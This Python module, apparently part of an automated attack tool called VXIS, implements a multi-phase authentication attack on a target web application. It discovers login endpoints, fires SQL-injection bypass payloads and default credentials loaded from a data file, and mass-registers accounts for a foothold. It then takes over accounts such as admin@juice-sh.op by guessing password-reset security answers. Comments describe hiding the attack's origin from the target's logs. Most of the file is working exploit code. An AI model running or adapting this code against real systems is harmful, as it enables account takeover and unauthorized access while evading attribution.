"""Skill: attempt_auth — try to authenticate via multiple methods."""

from __future__ import annotations
import base64
import html
import json
import logging
import re
import secrets
from typing import Any

from ._payload_loader import load_skill_dataset as _load_ds

logger = logging.getLogger(__name__)

# Generic non-identifying email for negative-control baseline login probes.
# Must NOT contain "vxis" or any other tool-identifying string.
_NEGATIVE_CONTROL_EMAIL = "baseline-check@example.invalid"

# Default credentials to try
DEFAULT_CREDS = [
    tuple(_c) for _c in _load_ds("attempt_auth", "default_creds")
]  # ADR-007 Phase 3-9 — data in data/payloads/attempt_auth.json

# SQLi bypass payloads
SQLI_CREDS = [
    tuple(_c) for _c in _load_ds("attempt_auth", "sqli_creds")
]  # ADR-007 Phase 3-9 — data in data/payloads/attempt_auth.json

# Common login endpoint patterns
LOGIN_PATHS = _load_ds(
    "attempt_auth", "login_paths"
)  # ADR-007 Phase 3-9 — data in data/payloads/attempt_auth.json

# Common password reset patterns
RESET_PATHS = _load_ds(
    "attempt_auth", "reset_paths"
)  # ADR-007 Phase 3-9 — data in data/payloads/attempt_auth.json

_JS_REF_RE = re.compile(r"""(?:src|href)=["']([^"']+\.js(?:\?[^"']*)?)["']""", re.IGNORECASE)
_AUTH_FRAGMENT_RE = re.compile(
    r"""["']((?:[A-Za-z0-9_-]+/)*(?:api|auth|rest)[A-Za-z0-9_./-]{0,80}(?:login|sign[_-]?in|signup|register|sessions?|token))["']""",
    re.IGNORECASE,
)
_SERVICE_PREFIX_RE = re.compile(r"""["']([A-Za-z][A-Za-z0-9_-]{1,32}/)["']""")


def _preview_text(text: str) -> str:
    return "[response body redacted]" if text else ""


def _decode_jwt_claims(token: str) -> dict[str, Any]:
    parts = str(token or "").split(".")
    if len(parts) < 2:
        return {}
    payload = parts[1].strip()
    if not payload:
        return {}
    try:
        decoded = base64.urlsafe_b64decode(payload + "=" * (-len(payload) % 4))
        parsed = json.loads(decoded.decode("utf-8", "ignore"))
    except Exception:
        return {}
    return parsed if isinstance(parsed, dict) else {}


def _claim_value(claims: dict[str, Any], *paths: tuple[str, ...]) -> Any:
    for path in paths:
        current: Any = claims
        for part in path:
            if not isinstance(current, dict):
                current = None
                break
            current = current.get(part)
        if current not in (None, ""):
            return current
    return None


def _normalize_path_candidate(path: str) -> str:
    clean = str(path or "").strip()
    if not clean:
        return ""
    if clean.startswith("http://") or clean.startswith("https://"):
        from urllib.parse import urlparse

        parsed = urlparse(clean)
        clean = parsed.path or "/"
    clean = "/" + clean.lstrip("/")
    return clean.split("?", 1)[0]


def _extract_js_paths(body: str) -> list[str]:
    seen: set[str] = set()
    paths: list[str] = []
    for match in _JS_REF_RE.finditer(body or ""):
        path = _normalize_path_candidate(html.unescape(match.group(1)))
        if not path or path in seen:
            continue
        seen.add(path)
        paths.append(path)
    return paths


def _extract_asset_auth_paths(text: str) -> list[str]:
    seen: set[str] = set()
    paths: list[str] = []
    for match in _AUTH_FRAGMENT_RE.finditer(text or ""):
        fragment = _normalize_path_candidate(match.group(1))
        if fragment and fragment not in seen:
            seen.add(fragment)
            paths.append(fragment)
        window = text[max(0, match.start() - 200) : min(len(text), match.end() + 200)]
        for prefix in _SERVICE_PREFIX_RE.findall(window):
            prefixed = _normalize_path_candidate(f"{prefix}{fragment.lstrip('/')}")
            if prefixed and prefixed not in seen:
                seen.add(prefixed)
                paths.append(prefixed)
    return paths


async def _discover_asset_auth_paths(session: Any) -> list[str]:
    seen: set[str] = set()
    candidates: list[str] = []
    try:
        root = await session.request("GET", "/")
    except Exception:
        return []

    def add(paths: list[str]) -> None:
        for path in paths:
            if not path or path in seen:
                continue
            seen.add(path)
            candidates.append(path)

    add(_extract_asset_auth_paths(root.text))
    for js_path in _extract_js_paths(root.text)[:5]:
        try:
            js = await session.request("GET", js_path)
        except Exception:
            continue
        add(_extract_asset_auth_paths(js.text))
    return candidates


def _extract_token_and_user_info(data: dict[str, Any]) -> tuple[str, dict[str, str]]:
    token = ""
    for key_path in [("authentication", "token"), ("token",), ("access_token",), ("data", "token")]:
        d: object = data
        for k in key_path:
            d = d.get(k, {}) if isinstance(d, dict) else {}
        if isinstance(d, str) and len(d) > 20:
            token = d
            break
    auth = data.get("authentication", data) if isinstance(data, dict) else {}
    user_info = {
        "email": auth.get("umail", auth.get("email", "")) if isinstance(auth, dict) else "",
        "role": auth.get("role", "") if isinstance(auth, dict) else "",
        "id": auth.get("bid", auth.get("id", "")) if isinstance(auth, dict) else "",
    }
    if token:
        claims = _decode_jwt_claims(token)
        if not user_info["role"]:
            claim_role = _claim_value(claims, ("role",), ("data", "role"))
            if claim_role not in (None, ""):
                user_info["role"] = str(claim_role)
        if not user_info["email"]:
            claim_email = _claim_value(
                claims,
                ("email",),
                ("umail",),
                ("data", "email"),
                ("data", "umail"),
            )
            if claim_email in (None, ""):
                claim_email = _claim_value(claims, ("sub",))
            if claim_email not in (None, "") and "@" in str(claim_email):
                user_info["email"] = str(claim_email)
        if not user_info["id"]:
            claim_id = _claim_value(claims, ("id",), ("bid",), ("data", "id"), ("data", "bid"))
            if claim_id in (None, ""):
                subject = _claim_value(claims, ("sub",))
                if subject not in (None, "") and str(subject).isdigit():
                    claim_id = subject
            if claim_id not in (None, ""):
                user_info["id"] = str(claim_id)
    return token, user_info


def _identity_name(raw: dict[str, Any], index: int) -> str:
    for key in ("name", "identity", "email", "role", "id"):
        value = str(raw.get(key) or "").strip()
        if value:
            clean = re.sub(r"[^A-Za-z0-9_.:@-]+", "-", value).strip("-")
            if clean:
                return clean[:80]
    return f"identity-{index + 1}"


def _credential_specs(raw: Any) -> list[dict[str, str]]:
    """Normalize operator-supplied credential lists without changing defaults."""
    specs: list[dict[str, str]] = []
    if isinstance(raw, dict):
        iterable = []
        for name, value in raw.items():
            item = dict(value or {}) if isinstance(value, dict) else {}
            item.setdefault("name", str(name))
            iterable.append(item)
    elif isinstance(raw, (list, tuple)):
        iterable = list(raw)
    else:
        iterable = []

    for index, item in enumerate(iterable):
        if isinstance(item, dict):
            email = str(item.get("email") or item.get("username") or item.get("user") or "").strip()
            password = str(
                item.get("password") or item.get("pass") or item.get("pwd") or ""
            ).strip()
            if not email or not password:
                continue
            specs.append(
                {
                    "email": email,
                    "password": password,
                    "name": str(item.get("name") or item.get("identity") or ""),
                    "role": str(item.get("role") or ""),
                    "source": str(item.get("source") or "operator_credentials"),
                }
            )
        elif isinstance(item, (list, tuple)) and len(item) >= 2:
            specs.append(
                {
                    "email": str(item[0]),
                    "password": str(item[1]),
                    "name": "",
                    "role": "",
                    "source": f"operator_credentials[{index}]",
                }
            )
    return specs


def _principal_from_success(success: dict[str, Any], index: int) -> dict[str, Any]:
    user_info = dict(success.get("user_info") or {})
    creds = dict(success.get("credentials_used") or {})
    raw = {
        "name": success.get("identity") or user_info.get("email") or creds.get("email"),
        "email": user_info.get("email") or creds.get("email"),
        "role": user_info.get("role") or success.get("role") or "",
        "id": user_info.get("id") or "",
    }
    principal: dict[str, Any] = {
        "name": _identity_name(raw, index),
        "token": str(success.get("token") or ""),
        "role": str(raw.get("role") or ""),
        "email": str(raw.get("email") or ""),
        "source": str(success.get("method") or ""),
    }
    subject_id = str(raw.get("id") or "").strip()
    if subject_id:
        principal["id"] = subject_id
        principal["owned_ids"] = [subject_id]
    return principal


def _dedupe_identities(successes: list[dict[str, Any]]) -> list[dict[str, Any]]:
    identities: list[dict[str, Any]] = []
    seen: set[tuple[str, str]] = set()
    for success in successes:
        principal = _principal_from_success(success, len(identities))
        key = (principal.get("name", ""), principal.get("token", ""))
        if not key[0] and not key[1]:
            continue
        if key in seen:
            continue
        seen.add(key)
        identities.append(principal)
    return identities


def _owner_map_from_identities(identities: list[dict[str, Any]]) -> dict[str, str]:
    owners: dict[str, str] = {}
    for identity in identities:
        name = str(identity.get("name") or "")
        if not name:
            continue
        for obj_id in identity.get("owned_ids") or []:
            owners.setdefault(str(obj_id), name)
    return owners


def _format_login_transcript(
    endpoint: str,
    creds: dict[str, str],
    status: int,
    preview: str,
    *,
    label: str,
) -> str:
    del creds
    body = '{"email":"[redacted]","password":"[redacted]"}'
    return (
        f"[{label}]\n"
        f"POST {endpoint} HTTP/1.1\n"
        "Content-Type: application/json\n\n"
        f"{body}\n\n"
        f"HTTP/1.1 {status}\n\n"
        f"{preview}"
    )


def _public_signup_payloads(*, suffix: str, email: str, password: str) -> list[dict[str, str]]:
    username = f"user_{suffix}"
    name = f"User {suffix}"
    number = f"555{suffix[:4]}"
    return [
        {"username": username, "email": email, "password": password},
        {"name": name, "email": email, "password": password},
        {"username": username, "name": name, "email": email, "password": password, "number": number},
    ]


async def execute(target_url: str, **kwargs: Any) -> dict[str, Any]:
    """Try multiple authentication methods against the target.

    Returns:
        {
            "authenticated": bool,
            "method": str,  # "default_creds", "sqli_bypass", "password_reset"
            "token": str,
            "user_info": dict,
            "login_endpoint": str,
            "credentials_used": dict,
            "all_attempts": [{"endpoint": ..., "creds": ..., "status": int}, ...],
            "control_checks": {...},
            "poc_http_exchange": str,
        }
    """
    from vxis.interaction.hands import SessionManager

    target = target_url.rstrip("/")
    all_attempts: list[dict[str, Any]] = []
    result = {
        "authenticated": False,
        "method": "",
        "token": "",
        "user_info": {},
        "login_endpoint": "",
        "credentials_used": {},
        "identities": [],
        "primary_identity": "",
        "owner_map": {},
        "all_attempts": all_attempts,
        "control_checks": {},
        "poc_http_exchange": "",
    }

    _mgr = SessionManager()
    _session = await _mgr.get_session(target)
    successful_logins: list[dict[str, Any]] = []

    # Phase 1: Find login endpoint
    active_login = ""
    fallback_login = ""
    probed_logins: set[str] = set()

    async def _probe_login_candidates(paths: list[str]) -> None:
        nonlocal active_login, fallback_login
        for path in paths:
            if active_login or not path or path in probed_logins:
                continue
            probed_logins.add(path)
            try:
                r = await _session.request("POST", path, json_data={"email": "x", "password": "x"})
            except Exception:
                continue
            if r.status in {200, 400, 401, 403, 422, 429}:
                active_login = path
                logger.info("Found login endpoint: %s (status %d)", path, r.status)
                return
            if not fallback_login and r.status in {301, 302, 303, 307, 308, 405, 415}:
                fallback_login = path

    await _probe_login_candidates([str(path) for path in LOGIN_PATHS])

    if not active_login:
        # Try GET-based login forms
        for path in ["/login", "/signin", "/#/login"]:
            try:
                r = await _session.request("GET", path)
                if r.status == 200 and ("password" in r.text.lower() or "login" in r.text.lower()):
                    active_login = path.replace("/#/", "/rest/user/")  # guess REST endpoint
                    break
            except Exception:
                continue

    if not active_login:
        try:
            asset_candidates = [
                path
                for path in await _discover_asset_auth_paths(_session)
                if any(marker in path.lower() for marker in ("login", "sign-in", "sign_in", "signin"))
            ]
            await _probe_login_candidates(asset_candidates)
        except Exception:
            pass

    if not active_login and fallback_login:
        active_login = fallback_login
        logger.info("Using fallback login endpoint: %s", active_login)

    if not active_login:
        return {**result, "error": "No login endpoint found"}

    async def _record_login_attempt(
        email: str,
        pwd: str,
        *,
        phase: str,
        identity_hint: str = "",
    ) -> dict[str, Any] | None:
        try:
            identity = identity_hint or _identity_name({"email": email}, len(all_attempts))
            session = (
                _session
                if phase == "negative_control"
                else await _mgr.get_session(target, identity=f"{phase}:{identity}")
            )
            r = await session.request(
                "POST", active_login, json_data={"email": email, "password": pwd}
            )
        except Exception:
            return None
        preview = _preview_text(r.text)
        attempt = {
            "phase": phase,
            "endpoint": active_login,
            "creds": "[redacted]",
            "status": r.status,
            "body_length": r.body_length,
            "response_preview": preview,
            "token_observed": False,
        }
        try:
            data = r.response.json()
        except Exception:
            data = {}
        token, user_info = _extract_token_and_user_info(data if isinstance(data, dict) else {})
        attempt["token_observed"] = bool(token)
        all_attempts.append(attempt)
        return {"response": r, "attempt": attempt, "token": token, "user_info": user_info}

    def _success_result(
        *,
        method: str,
        email: str,
        password: str = "",
        token: str,
        user_info: dict[str, Any],
        positive_attempt: dict[str, Any],
        label: str,
        extra_credentials: dict[str, str] | None = None,
    ) -> dict[str, Any]:
        control_checks = {
            "negative_control": baseline_control["attempt"] if baseline_control else {},
            "positive_control": positive_attempt,
        }
        credentials_used = {
            key: "[redacted]"
            for key in (extra_credentials or {"email": email, "password": password})
        }
        poc_http_exchange = "\n\n".join(
            filter(
                None,
                [
                    _format_login_transcript(
                        active_login,
                        {
                            "email": _NEGATIVE_CONTROL_EMAIL,
                            "password": "definitely-wrong-password",
                        },
                        baseline_control["attempt"]["status"],
                        baseline_control["attempt"].get("response_preview", ""),
                        label="negative_control",
                    )
                    if baseline_control
                    else "",
                    _format_login_transcript(
                        active_login,
                        {"email": email, "password": password},
                        positive_attempt["status"],
                        positive_attempt.get("response_preview", ""),
                        label=label,
                    ),
                ],
            )
        )
        return {
            "authenticated": True,
            "method": method,
            "token": token,
            "user_info": user_info,
            "login_endpoint": active_login,
            "credentials_used": credentials_used,
            "control_checks": control_checks,
            "poc_http_exchange": poc_http_exchange,
        }

    def _finalize_successes() -> dict[str, Any]:
        if not successful_logins:
            return {}
        primary = successful_logins[0]
        identities = _dedupe_identities(successful_logins)
        return {
            **result,
            **primary,
            "all_attempts": all_attempts,
            "identities": identities,
            "primary_identity": identities[0]["name"] if identities else "",
            "owner_map": _owner_map_from_identities(identities),
            "successful_attempts": [
                {
                    "method": item.get("method", ""),
                    "identity": _principal_from_success(item, idx).get("name", ""),
                    "login_endpoint": item.get("login_endpoint", ""),
                    "status": (item.get("control_checks", {}) or {})
                    .get("positive_control", {})
                    .get("status"),
                }
                for idx, item in enumerate(successful_logins)
            ],
        }

    baseline_control = await _record_login_attempt(
        _NEGATIVE_CONTROL_EMAIL,
        "definitely-wrong-password",
        phase="negative_control",
    )

    # Phase 2: Try SQLi bypass first (highest value)
    for email, pwd in SQLI_CREDS:
        outcome = await _record_login_attempt(email, pwd, phase="sqli_bypass")
        if not outcome:
            continue
        if outcome["response"].status == 200 and outcome["token"]:
            logger.info("SQLi authentication bypass succeeded")
            successful_logins.append(
                _success_result(
                    method="sqli_bypass",
                    email=email,
                    password=pwd,
                    token=outcome["token"],
                    user_info=outcome["user_info"],
                    positive_attempt=outcome["attempt"],
                    label="positive_bypass",
                )
            )

    # Phase 3: Try default credentials
    operator_creds = _credential_specs(
        kwargs.get("credentials")
        or kwargs.get("credential_set")
        or kwargs.get("identity_credentials")
        or kwargs.get("users")
    )
    default_specs = [
        {"email": email, "password": pwd, "name": "", "role": "", "source": "default_creds"}
        for email, pwd in DEFAULT_CREDS
    ]
    for spec in [*operator_creds, *default_specs]:
        email = spec["email"]
        pwd = spec["password"]
        phase = spec.get("source") or "default_creds"
        outcome = await _record_login_attempt(
            email,
            pwd,
            phase=phase,
            identity_hint=spec.get("name", ""),
        )
        if not outcome:
            continue
        if outcome["response"].status == 200 and outcome["token"]:
            logger.info("Credential authentication succeeded")
            success = _success_result(
                method="default_creds" if not operator_creds else phase,
                email=email,
                password=pwd,
                token=outcome["token"],
                user_info={
                    **outcome["user_info"],
                    "role": outcome["user_info"].get("role") or spec.get("role", ""),
                },
                positive_attempt=outcome["attempt"],
                label="positive_default_creds",
            )
            if spec.get("name"):
                success["identity"] = spec["name"]
            if spec.get("role"):
                success["role"] = spec["role"]
            successful_logins.append(success)

    if successful_logins:
        return _finalize_successes()

    # Phase 4: Try public signup for a low-priv foothold
    reg_paths: list[str] = []
    try:
        for path in await _discover_asset_auth_paths(_session):
            lower = path.lower()
            if any(marker in lower for marker in ("signup", "register")) and path not in reg_paths:
                reg_paths.append(path)
    except Exception:
        pass
    for path in ["/api/users", "/api/register", "/api/signup", "/api/account"]:
        if path not in reg_paths:
            reg_paths.append(path)

    public_signup_successes: list[dict[str, Any]] = []
    for path in reg_paths:
        while len(public_signup_successes) < 2:
            suffix = secrets.token_hex(4)
            email = f"{suffix}@example.test"
            password = f"Test1234!{suffix}"
            created = False
            for body in _public_signup_payloads(suffix=suffix, email=email, password=password):
                try:
                    response = await _session.request("POST", path, json_data=body)
                except Exception:
                    continue
                if response.status not in (200, 201):
                    continue
                outcome = await _record_login_attempt(
                    email,
                    password,
                    phase="public_signup",
                    identity_hint=str(body.get("username") or ""),
                )
                if not outcome or outcome["response"].status != 200 or not outcome["token"]:
                    continue
                success = _success_result(
                    method="public_signup",
                    email=email,
                    password=password,
                    token=outcome["token"],
                    user_info=outcome["user_info"],
                    positive_attempt=outcome["attempt"],
                    label="positive_public_signup",
                )
                success["signup_endpoint"] = path
                public_signup_successes.append(success)
                created = True
                break
            if not created:
                break
        if len(public_signup_successes) >= 2:
            break

    if public_signup_successes:
        successful_logins.extend(public_signup_successes)
        return _finalize_successes()

    # Phase 5: Try password reset with common security answers
    for reset_path in RESET_PATHS:
        try:
            # First check if endpoint exists
            r = await _session.request(
                "POST",
                reset_path,
                json_data={"email": "test", "answer": "x", "new": "x", "repeat": "x"},
            )
            if r.status == 404:
                continue

            # Try common email+answer combos
            common_resets = [
                ("admin@juice-sh.op", ["Samuel", "admin", "Admin"]),
                ("jim@juice-sh.op", ["Samuel", "Kirk", "Enterprise"]),
                ("admin", ["admin", "password", "root"]),
            ]
            for email, answers in common_resets:
                for ans in answers:
                    # Generate a unique non-identifying password per attempt so
                    # the reset value stored/logged on the target does NOT
                    # attribute the attack to VXIS.
                    reset_password = f"Reset-{secrets.token_hex(6)}"
                    r = await _session.request(
                        "POST",
                        reset_path,
                        json_data={
                            "email": email,
                            "answer": ans,
                            "new": reset_password,
                            "repeat": reset_password,
                        },
                    )
                    if r.status == 200:
                        # Try logging in with new password
                        r2 = await _session.request(
                            "POST",
                            active_login,
                            json_data={"email": email, "password": reset_password},
                        )
                        if r2.status == 200:
                            data = r2.response.json()
                            token = ""
                            for key_path in [("authentication", "token"), ("token",)]:
                                d = data
                                for k in key_path:
                                    d = d.get(k, {}) if isinstance(d, dict) else {}
                                if isinstance(d, str) and len(d) > 20:
                                    token = d
                                    break
                            if token:
                                logger.info("Password reset authentication succeeded")
                                reset_preview = _preview_text(r.text)
                                login_preview = _preview_text(r2.text)
                                control_checks = {
                                    "negative_control": baseline_control["attempt"]
                                    if baseline_control
                                    else {},
                                    "positive_control": {
                                        "phase": "password_reset",
                                        "endpoint": active_login,
                                        "creds": "[redacted]",
                                        "status": r2.status,
                                        "body_length": r2.body_length,
                                        "response_preview": login_preview,
                                        "token_observed": True,
                                    },
                                    "reset_step": {
                                        "endpoint": reset_path,
                                        "status": r.status,
                                        "response_preview": reset_preview,
                                    },
                                }
                                return {
                                    **result,
                                    "authenticated": True,
                                    "method": "password_reset",
                                    "token": token,
                                    "identities": _dedupe_identities(
                                        [
                                            {
                                                "method": "password_reset",
                                                "token": token,
                                                "user_info": _extract_token_and_user_info(
                                                    data if isinstance(data, dict) else {}
                                                )[1],
                                                "credentials_used": {"email": email},
                                            }
                                        ]
                                    ),
                                    "login_endpoint": active_login,
                                    "credentials_used": {
                                        "email": "[redacted]",
                                        "security_answer": "[redacted]",
                                    },
                                    "reset_endpoint": reset_path,
                                    "all_attempts": all_attempts,
                                    "control_checks": control_checks,
                                    "poc_http_exchange": "\n\n".join(
                                        filter(
                                            None,
                                            [
                                                _format_login_transcript(
                                                    active_login,
                                                    {
                                                        "email": _NEGATIVE_CONTROL_EMAIL,
                                                        "password": "definitely-wrong-password",
                                                    },
                                                    baseline_control["attempt"]["status"],
                                                    baseline_control["attempt"].get(
                                                        "response_preview", ""
                                                    ),
                                                    label="negative_control",
                                                )
                                                if baseline_control
                                                else "",
                                                (
                                                    f"[password_reset]\n"
                                                    f"POST {reset_path} HTTP/1.1\n"
                                                    "Content-Type: application/json\n\n"
                                                    '{"email":"[redacted]","answer":"[redacted]",'
                                                    '"new":"[redacted]","repeat":"[redacted]"}\n\n'
                                                    f"HTTP/1.1 {r.status}\n\n"
                                                    f"{reset_preview}"
                                                ),
                                                _format_login_transcript(
                                                    active_login,
                                                    {
                                                        "email": email,
                                                        "password": "[reset_password]",
                                                    },
                                                    r2.status,
                                                    login_preview,
                                                    label="positive_login_after_reset",
                                                ),
                                            ],
                                        )
                                    ),
                                }
        except Exception:
            continue

    return {
        **result,
        "all_attempts": all_attempts,
        "control_checks": {
            "negative_control": baseline_control["attempt"] if baseline_control else {},
        },
    }
